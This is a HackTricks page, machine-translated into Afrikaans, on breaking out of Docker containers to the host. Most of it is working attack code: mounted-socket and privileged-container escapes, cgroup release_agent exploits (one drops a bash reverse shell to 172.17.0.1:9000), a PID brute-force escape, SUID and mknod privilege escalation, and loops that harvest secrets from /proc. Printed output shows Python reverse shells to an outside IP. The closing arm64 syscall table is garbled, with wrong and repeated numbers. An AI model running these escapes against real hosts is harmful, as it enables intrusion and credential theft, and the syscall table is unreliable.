# Docker Uitbreek / Voorregverhoging

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** met behulp van die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Outomatiese Opsomming & Ontsnapping

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Dit kan ook **houers opsom**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Hierdie instrument is baie **nuttig om die houer waarin jy is op te som, selfs om outomaties te probeer ontsnap**
* [**amicontained**](https://github.com/genuinetools/amicontained): Nuttige instrument om die voorregte van die houer te kry om maniere te vind om daaruit te ontsnap
* [**deepce**](https://github.com/stealthcopter/deepce): Instrument om houers op te som en daaruit te ontsnap
* [**grype**](https://github.com/anchore/grype): Kry die CVE's wat in die sagteware geïnstalleer in die beeld bevat word

## Ontsnapping van Gemoniteerde Docker-sokkel

As jy op een of ander manier vind dat die **docker-sokkel gemoniteer** is binne die docker-houer, sal jy daaruit kan ontsnap.\
Dit gebeur gewoonlik in docker-houers wat om een of ander rede moet koppel aan die docker-daemon om aksies uit te voer.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
In hierdie geval kan jy gewone docker-opdragte gebruik om met die docker daemon te kommunikeer:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
In die geval dat die **docker sokket op 'n onverwagte plek** is, kan jy steeds daarmee kommunikeer deur die **`docker`** bevel te gebruik met die parameter **`-H unix:///path/to/docker.sock`**
{% endhint %}

Die Docker daemon kan ook [luister op 'n poort (standaard 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) of op Systemd-gebaseerde stelsels kan kommunikasie met die Docker daemon plaasvind oor die Systemd sokket `fd://`.

{% hint style="info" %}
Daarbenewens, let op die uitvoeringsokkels van ander hoëvlak-uitvoeringsomgewings:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Misbruik van Bevoegdhede Ontsnapping

Jy moet die bevoegdhede van die houer nagaan, as dit een van die volgende het, kan jy daaruit ontsnap: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Jy kan die huidige bevoegdhede van die houer nagaan deur die **voorheen genoemde outomatiese gereedskap** of:
```bash
capsh --print
```
In die volgende bladsy kan jy **meer leer oor Linux-vermoëns** en hoe om dit te misbruik om voorregte te ontsnap/verhoog:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Ontsnap uit Bevoorregte Houers

'n Bevoorregte houer kan geskep word met die vlag `--privileged` of deur spesifieke verdedigings uit te skakel:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Die `--privileged` vlag verminder aansienlik die veiligheid van die houer, deur **ongeoorloofde toegang tot toestelle** te bied en **verskeie beskermings te omseil**. Vir 'n gedetailleerde uiteensetting, verwys na die dokumentasie oor die volle impakte van `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Bevoorregte + hostPID

Met hierdie toestemmings kan jy net **beweeg na die naamruimte van 'n proses wat as root in die gasheer hardloop**, soos init (pid:1), deur net die volgende uit te voer: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Toets dit in 'n houer deur die volgende uit te voer:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Bevoorreg

Net met die bevoorregte vlag kan jy probeer om **toegang tot die gasheer se skyf** te verkry of probeer om te **ontsnap deur misbruik te maak van release\_agent of ander ontsnappings**.

Toets die volgende omseilings in 'n houer uit te voer:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Monteer Disk - Poc1

Goed geconfigureerde Docker-houders sal nie opdragte soos **fdisk -l** toelaat nie. Tog, op 'n verkeerd gekonfigureerde Docker-opdrag waar die vlag `--privileged` of `--device=/dev/sda1` met kapasiteit gespesifiseer word, is dit moontlik om die voorregte te verkry om die gasheer-aandrywing te sien.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Om dus die gasheer-rekenaar oor te neem, is dit eenvoudig:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
En voilà! Jy kan nou toegang verkry tot die lêersisteem van die gasheer omdat dit in die `/mnt/hola`-vouer gemoniteer is.

#### Monteer Disk - Poc2

Binne die houer kan 'n aanvaller probeer om verdere toegang tot die onderliggende gasheer-bedryfstelsel te verkry deur 'n skryfbare hostPath-volume wat deur die groep geskep is. Hieronder is 'n paar algemene dinge wat jy binne die houer kan nagaan om te sien of jy hierdie aanvallervektor kan benut:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Bevoorregte Ontsnapping deur gebruik te maak van bestaande release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Aanvanklike PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Bevoorregte Ontsnapping deur die skepping van 'n release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Tweede PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Vind 'n **verduideliking van die tegniek** in:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Bevoorregte Ontsnapping deur release\_agent te misbruik sonder om die relatiewe pad te ken - PoC3

In die vorige aanvalle word die **absoluut pad van die houer binne die gasheer se lêersisteem bekend gemaak**. Dit is egter nie altyd die geval nie. In gevalle waar jy **nie die absoluut pad van die houer binne die gasheer ken nie** kan jy hierdie tegniek gebruik:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Die uitvoering van die PoC binne 'n bevoorregte houer moet 'n uitset gee wat soortgelyk is aan:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Bevoorregte Ontsnapping deur Misbruik van Sensitiewe Monteerplekke

Daar is verskeie lêers wat gemonteer kan word wat **inligting oor die onderliggende gasheer gee**. Sommige van hulle kan selfs **aandui dat iets deur die gasheer uitgevoer moet word wanneer iets gebeur** (wat 'n aanvaller in staat sal stel om uit die houer te ontsnap).\
Die misbruik van hierdie lêers kan veroorsaak dat:

* release\_agent (reeds voorheen gedek)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Jy kan egter **ander sensitiewe lêers** vind om na te kyk op hierdie bladsy:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Willekeurige Monteerplekke

In verskeie gevalle sal jy vind dat die **houer 'n volume van die gasheer gemonteer het**. As hierdie volume nie korrek gekonfigureer is nie, kan jy dalk **toegang verkry tot/wysiging maak aan sensitiewe data**: Lees geheime, verander ssh authorized\_keys...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Voorregverhoging met 2 doppe en gasheer monteer

As jy toegang het as **root binne 'n houer** wat 'n paar vouers van die gasheer gemonteer het en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer** en het leestoegang oor die gemonteerde vouer.\
Jy kan 'n **bash suid-lêer** skep in die **gemonteerde vouer** binne die **houer** en dit vanaf die gasheer **uitvoer** om voorregverhoging te bewerkstellig.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Voorregverhoging met 2 skulpe

As jy toegang het as **root binne 'n houer** en jy het **ontsnap as 'n nie-bevoorregte gebruiker na die gasheer**, kan jy beide skulpe misbruik om **voorregverhoging binne die gasheer** te bewerkstellig as jy die MKNOD-vermoë binne die houer het (dit is standaard) soos [**verduidelik in hierdie pos**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Met so 'n vermoë word die root-gebruiker binne die houer toegelaat om **bloktoestel-lêers te skep**. Toestel-lêers is spesiale lêers wat gebruik word om **onderliggende hardeware- en kernmodules te benader**. Byvoorbeeld, die /dev/sda bloktoestel-lêer gee toegang om **die rou data op die stelsel se skyf te lees**.

Docker beskerm teen misbruik van bloktoestelle binne houers deur 'n cgroup-beleid af te dwing wat **bloktoestel lees-/skryfhandelinge blokkeer**. Nietemin, as 'n bloktoestel **binne die houer geskep word**, word dit toeganklik van buite die houer via die **/proc/PID/root/** gids. Hierdie toegang vereis dat die **proses-eienaar dieselfde is** binne en buite die houer.

**Uitbuiting** voorbeeld van hierdie [**verslag**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

As jy toegang het tot die prosesse van die gasheer, sal jy toegang hê tot baie sensitiewe inligting wat in daardie prosesse gestoor word. Voer toetslaboratorium uit:
```
docker run --rm -it --pid=host ubuntu bash
```
Byvoorbeeld, sal jy in staat wees om die prosesse te lys deur iets soos `ps auxn` te gebruik en te soek na sensitiewe besonderhede in die opdragte.

Dan, aangesien jy **toegang het tot elke proses van die gasheer in /proc/, kan jy net hul omgewingsgeheime steel** deur die volgende uit te voer:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Jy kan ook **toegang verkry tot ander prosesse se lêerbeskrywers en hul oop lêers lees**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Jy kan ook **prosesse doodmaak en 'n DoS veroorsaak**.

{% hint style="warning" %}
As jy op een of ander manier bevoorregte **toegang het tot 'n proses buite die houer**, kan jy iets soos `nsenter --target <pid> --all` of `nsenter --target <pid> --mount --net --pid --cgroup` hardloop om **'n skul met dieselfde ns-beperkings** (hopelik geen) **as daardie proses** uit te voer.
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
As 'n houer gekonfigureer is met die Docker [host-netwerkbestuurder (`--network=host`)](https://docs.docker.com/network/host/), is daardie houer se netwerkstapel nie geïsoleer van die Docker-gashouer nie (die houer deel die gashouer se netwerk-namespace) en die houer kry nie sy eie IP-adres toegewys nie. Met ander woorde, die **houer bind alle dienste direk aan die gashouer se IP**. Verder kan die houer **ALLE netwerkverkeer onderskep wat die gashouer** stuur en ontvang op die gedeelde koppelvlak `tcpdump -i eth0`.

Byvoorbeeld, jy kan dit gebruik om verkeer tussen die gashouer en metadata-instansie **af te luister en selfs te vervals**.

Soos in die volgende voorbeelde:

* [Writeup: Hoe om Google SRE te kontak: 'n Skulp in die wolk SQL laat val](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata-diens MITM maak wortelvoorregverhoging moontlik (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Jy sal ook in staat wees om toegang te verkry tot **netwerkdienste wat aan die localhost gebind is** binne die gashouer of selfs toegang te verkry tot die **metadata-permissies van die node** (wat verskillend kan wees as dié wat 'n houer kan verkry).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Met `hostIPC=true` kry jy toegang tot die gasheer se interproseskommunikasie (IPC) hulpbronne, soos **gedeelde geheue** in `/dev/shm`. Dit maak dit moontlik om te lees/skryf waar dieselfde IPC-hulpbronne deur ander gasheer- of houerprosesse gebruik word. Gebruik `ipcs` om hierdie IPC-meganismes verder te ondersoek.

* **Ondersoek /dev/shm** - Kyk vir enige lêers in hierdie gedeelde geheue-plek: `ls -la /dev/shm`
* **Ondersoek bestaande IPC-fasiliteite** - Jy kan nagaan of enige IPC-fasiliteite gebruik word met `/usr/bin/ipcs`. Kontroleer dit met: `ipcs -a`

### Herstel bevoegdhede

As die systoeproep **`unshare`** nie verbied is nie, kan jy al die bevoegdhede herstel deur die volgende uit te voer:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Gebruikersnaamruimte-misbruik via symboliese koppeling

Die tweede tegniek wat in die berig [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) verduidelik word, dui aan hoe jy bindkoppeling met gebruikersnaamruimtes kan misbruik om lêers binne die gasheer te beïnvloed (in daardie spesifieke geval, lêers uitvee).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik werkstrome te bou en outomatiseer met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVE's

### Runc-uitbuiting (CVE-2019-5736)

In die geval dat jy `docker exec` as root kan uitvoer (waarskynlik met sudo), kan jy probeer om voorregte te verhoog deur te ontsnap uit 'n houer wat misbruik maak van CVE-2019-5736 (uitbuiting [hier](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Hierdie tegniek sal basies die _**/bin/sh**_ binêre lêer van die **gasheer** **oorvleuel** vanuit 'n houer, sodat enigeen wat docker exec uitvoer die nut kan aktiveer.

Verander die nut volgens jou behoeftes en bou die main.go met `go build main.go`. Die resulterende binêre lêer moet in die docker-houer geplaas word vir uitvoering.\
By uitvoering, sodra dit `[+] Overwritten /bin/sh successfully` vertoon, moet jy die volgende vanaf die gasheermasjien uitvoer:

`docker exec -it <container-naam> /bin/sh`

Dit sal die nut aktiveer wat in die main.go-lêer aanwesig is.

Vir meer inligting: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Daar is ander CVE's waarop die houer kwesbaar kan wees, jy kan 'n lys vind by [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Aangepaste Docker-ontsnapping

### Docker-ontsnappingsoppervlak

* **Naamruimtes:** Die proses moet **volledig geskei wees van ander prosesse** via naamruimtes, sodat ons nie kan ontsnap deur met ander prosesse te kommunikeer nie (kan nie standaard kommunikeer via IPC's, Unix-aansluitings, netwerkdienste, D-Bus, `/proc` van ander prosesse nie).
* **Root-gebruiker**: Standaard is die gebruiker wat die proses uitvoer die root-gebruiker (tans beperkte voorregte).
* **Vermoëns**: Docker laat die volgende vermoëns agter: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Dit is die syscalls wat die **root-gebruiker nie sal kan aanroep nie** (as gevolg van ontbrekende vermoëns + Seccomp). Die ander syscalls kan gebruik word om te probeer ontsnap.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

Hier is 'n lys van die mees gebruikte arm64-sistemaanroepe:

| Sistemaanroep | Nommer |
| --- | --- |
| read | 63 |
| write | 64 |
| open | 1024 |
| close | 57 |
| stat | 106 |
| fstat | 80 |
| lstat | 107 |
| poll | 7 |
| lseek | 62 |
| mmap | 222 |
| mprotect | 226 |
| munmap | 215 |
| brk | 214 |
| rt_sigaction | 134 |
| rt_sigprocmask | 135 |
| rt_sigreturn | 139 |
| ioctl | 29 |
| pread64 | 67 |
| pwrite64 | 68 |
| readv | 65 |
| writev | 66 |
| access | 103 |
| pipe | 104 |
| select | 82 |
| sched_yield | 124 |
| mremap | 216 |
| msync | 227 |
| mincore | 232 |
| madvise | 233 |
| shmget | 215 |
| shmat | 216 |
| shmctl | 217 |
| dup | 23 |
| dup2 | 24 |
| pause | 29 |
| nanosleep | 101 |
| getitimer | 102 |
| alarm | 27 |
| setitimer | 103 |
| getpid | 20 |
| sendfile | 71 |
| socket | 97 |
| connect | 98 |
| accept | 99 |
| sendto | 101 |
| recvfrom | 102 |
| sendmsg | 103 |
| recvmsg | 104 |
| shutdown | 116 |
| bind | 99 |
| listen | 106 |
| getsockname | 32 |
| getpeername | 31 |
| socketpair | 135 |
| setsockopt | 105 |
| getsockopt | 118 |
| clone | 220 |
| fork | 57 |
| vfork | 58 |
| execve | 221 |
| exit | 93 |
| wait4 | 260 |
| kill | 129 |
| uname | 63 |
| semget | 221 |
| semop | 222 |
| semctl | 223 |
| shmdt | 224 |
| msgget | 225 |
| msgsnd | 226 |
| msgrcv | 227 |
| msgctl | 228 |
| fcntl | 25 |
| flock | 32 |
| fsync | 82 |
| fdatasync | 83 |
| truncate | 92 |
| ftruncate | 93 |
| getdents | 78 |
| getcwd | 79 |
| chdir | 80 |
| fchdir | 81 |
| rename | 128 |
| mkdir | 83 |
| rmdir | 84 |
| creat | 85 |
| link | 86 |
| unlink | 87 |
| symlink | 88 |
| readlink | 89 |
| chmod | 90 |
| fchmod | 91 |
| chown | 92 |
| fchown | 93 |
| lchown | 94 |
| umask | 95 |
| gettimeofday | 96 |
| getrlimit | 97 |
| getrusage | 98 |
| sysinfo | 99 |
| times | 100 |
| ptrace | 101 |
| getuid | 102 |
| syslog | 103 |
| getgid | 104 |
| setuid | 105 |
| setgid | 106 |
| geteuid | 107 |
| getegid | 108 |
| setpgid | 109 |
| getppid | 110 |
| getpgrp | 111 |
| setsid | 112 |
| setreuid | 113 |
| setregid | 114 |
| getgroups | 115 |
| setgroups | 116 |
| setresuid | 117 |
| getresuid | 118 |
| setresgid | 119 |
| getresgid | 120 |
| getpgid | 121 |
| setfsuid | 122 |
| setfsgid | 123 |
| getsid | 124 |
| capget | 125 |
| capset | 126 |
| rt_sigpending | 127 |
| rt_sigtimedwait | 128 |
| rt_sigqueueinfo | 129 |
| rt_sigsuspend | 130 |
| sigaltstack | 131 |
| utime | 132 |
| mknod | 133 |
| uselib | 134 |
| personality | 135 |
| ustat | 136 |
| statfs | 137 |
| fstatfs | 138 |
| sysfs | 139 |
| getpriority | 140 |
| setpriority | 141 |
| sched_setparam | 142 |
| sched_getparam | 143 |
| sched_setscheduler | 144 |
| sched_getscheduler | 145 |
| sched_get_priority_max | 146 |
| sched_get_priority_min | 147 |
| sched_rr_get_interval | 148 |
| mlock | 149 |
| munlock | 150 |
| mlockall | 151 |
| munlockall | 152 |
| vhangup | 153 |
| modify_ldt | 154 |
| pivot_root | 155 |
| _sysctl | 156 |
| prctl | 157 |
| arch_prctl | 158 |
| adjtimex | 159 |
| setrlimit | 160 |
| chroot | 161 |
| sync | 162 |
| acct | 163 |
| settimeofday | 164 |
| mount | 165 |
| umount2 | 166 |
| swapon | 167 |
| swapoff | 168 |
| reboot | 169 |
